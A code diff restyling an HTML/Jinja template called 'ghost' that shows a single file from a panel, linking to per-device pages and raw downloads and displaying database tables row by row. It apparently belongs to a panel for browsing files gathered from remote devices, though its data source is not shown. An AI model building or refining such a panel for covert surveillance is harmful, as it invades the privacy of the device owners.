@@ -5,41 +5,88 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>ghost · {{ name }}</title>
 <style>
-  body { font-family: ui-monospace, Menlo, monospace; background:#0d0f12; color:#d7dae0; margin:0; padding:24px; }
-  h1 { font-size:14px; color:#8ea0b8; margin:0 0 4px; word-break:break-all; }
-  a { color:#7fd3ff; text-decoration:none; }
-  .tabs a { display:inline-block; padding:3px 8px; margin:2px; border:1px solid #1c2026; border-radius:3px; font-size:12px; }
-  .tabs a.active { background:#1c2026; color:#b5e08a; }
-  pre { background:#111418; padding:14px; border-radius:4px; overflow:auto; max-height:75vh; font-size:12px; line-height:1.5; }
-  table { border-collapse:collapse; width:100%; font-size:12px; }
-  th,td { text-align:left; padding:5px 8px; border-bottom:1px solid #1c2026; vertical-align:top; }
-  th { color:#7c8899; font-weight:400; }
-  img { max-width:100%; }
-  .muted { color:#5a6472; font-size:11px; }
+  :root {
+    --bg: #080b0d; --panel: #0c1116; --border: #123;
+    --green: #00ff9c; --green-dim: #0a6; --amber: #ffb347;
+    --text: #c8d6e5; --muted: #4a5a6b;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; padding: 20px;
+    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    background: var(--bg); color: var(--text);
+    font-size: 13px; line-height: 1.5;
+  }
+  body::before {
+    content: ""; position: fixed; inset: 0; pointer-events: none; z-index: 9999;
+    background: repeating-linear-gradient(
+      0deg, rgba(0,255,156,0.03) 0px, rgba(0,255,156,0.03) 1px,
+      transparent 1px, transparent 3px
+    );
+  }
+  h1 {
+    font-size: 12px; letter-spacing: 2px; color: var(--green);
+    margin: 0 0 4px; word-break: break-all; text-transform: uppercase;
+  }
+  h1::before { content: "▌ "; }
+  .crumbs { margin-bottom: 20px; font-size: 11px; }
+  .crumbs a { color: var(--green); text-decoration: none; }
+  .crumbs a:hover { text-shadow: 0 0 8px var(--green); }
+  .crumbs .sep { color: var(--muted); margin: 0 6px; }
+  .tabs { margin: 12px 0; display: flex; flex-wrap: wrap; gap: 4px; }
+  .tabs a {
+    font-size: 11px; padding: 3px 8px; border: 1px solid var(--border);
+    color: var(--muted); letter-spacing: 1px;
+  }
+  .tabs a.active { border-color: var(--green); color: var(--green); }
+  .tabs a:hover { color: var(--text); border-color: var(--green-dim); }
+  pre {
+    background: var(--panel); border: 1px solid var(--border);
+    padding: 14px; overflow: auto; max-height: 75vh;
+    font-size: 12px; line-height: 1.5; color: var(--text); margin: 0;
+  }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  th {
+    text-align: left; padding: 6px 8px; font-weight: 400;
+    color: var(--muted); font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+    border-bottom: 1px solid var(--border); position: sticky; top: 0; background: var(--bg);
+  }
+  td { padding: 6px 8px; border-bottom: 1px solid #0f1419; vertical-align: top; max-width: 260px; overflow: hidden; text-overflow: ellipsis; }
+  tr:hover td { background: #0e1419; }
+  img { max-width: 100%; border: 1px solid var(--border); }
+  .muted { color: var(--muted); font-size: 11px; }
+  .big { color: var(--amber); }
 </style>
 </head>
 <body>
-<h1>{{ name }} <span class="muted">({{ size }} bytes)</span></h1>
-<div class="muted"><a href="/panel">panel</a> · <a href="/panel/device/{{ device_id }}">{{ device_id }}</a> · <a href="/panel/raw/{{ device_id }}/{{ category }}/{{ name }}">[dl]</a></div>
+<h1>{{ name }}</h1>
+<div class="crumbs">
+  <a href="/panel">panel</a><span class="sep">·</span>
+  <a href="/panel/device/{{ device_id }}">{{ device_id }}</a><span class="sep">·</span>
+  <a href="/panel/raw/{{ device_id }}/{{ category }}/{{ name }}">[download]</a>
+  <span class="sep">·</span><span class="muted">{{ size }} bytes</span>
+</div>
 
 {% if mode == "text" %}
   <pre>{{ content }}</pre>
 
 {% elif mode == "binary" %}
-  <div class="muted">binary file</div>
+  <pre class="muted">binary file — use [download] above</pre>
 
 {% elif mode == "db" %}
   <div class="tabs">
     {% for t in tables %}<a href="?t={{ t }}" class="{% if t == current_table %}active{% endif %}">{{ t }}</a>{% endfor %}
   </div>
   {% if current_table %}
-    <div class="muted">showing up to 200 rows from <b>{{ current_table }}</b></div>
+    <div class="muted" style="margin-bottom:8px;">table <span class="big">{{ current_table }}</span> · up to 200 rows</div>
     <table>
-      <tr>{% for c in cols %}<th>{{ c }}</th>{% endfor %}</tr>
+      <thead><tr>{% for c in cols %}<th>{{ c }}</th>{% endfor %}</tr></thead>
+      <tbody>
       {% for r in rows %}<tr>{% for v in r %}<td>{{ v }}</td>{% endfor %}</tr>{% endfor %}
+      </tbody>
     </table>
   {% else %}
-    <div class="muted">pick a table above</div>
+    <div class="muted">select a table above</div>
   {% endif %}
 
 {% elif mode == "db_error" %}
